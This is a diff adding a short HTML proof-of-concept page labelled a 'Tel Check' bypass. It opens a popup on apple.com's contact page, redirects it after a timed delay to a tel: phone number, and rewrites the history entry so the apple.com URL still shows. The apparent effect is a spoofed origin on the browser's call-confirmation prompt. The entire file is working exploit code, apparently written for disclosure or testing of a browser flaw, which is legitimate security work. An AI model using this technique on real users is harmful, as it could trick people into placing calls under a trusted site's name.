@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Tel Check - Bypass PoC</title>
+</head>
+<body>
+    <li>Click button (40ms) <button onclick="pwn40()">Click Me</button></li>
+    <li>Click button (4000ms) <button onclick="pwn4000()">Click Me</button></li>
+    <br>
+
+    <script>
+        var pwn40 = () => {
+            let win = window.open("https://www.apple.com/contact/", "test", "width=400,height=400");
+
+            setTimeout(function() {
+                win.location.href = 'tel:+1234567890';
+                win.history.replaceState({}, "", "https://www.apple.com/contact/");
+            }, 40);
+        };
+
+        var pwn4000 = () => {
+            let win = window.open("https://www.apple.com/contact/", "test", "width=400,height=400");
+
+            setTimeout(function() {
+                win.location.href = 'tel:+919747000000';
+                win.history.replaceState({}, "", "https://www.apple.com/contact/");
+            }, 4000);
+        };
+    </script>
+</body>
+</html>
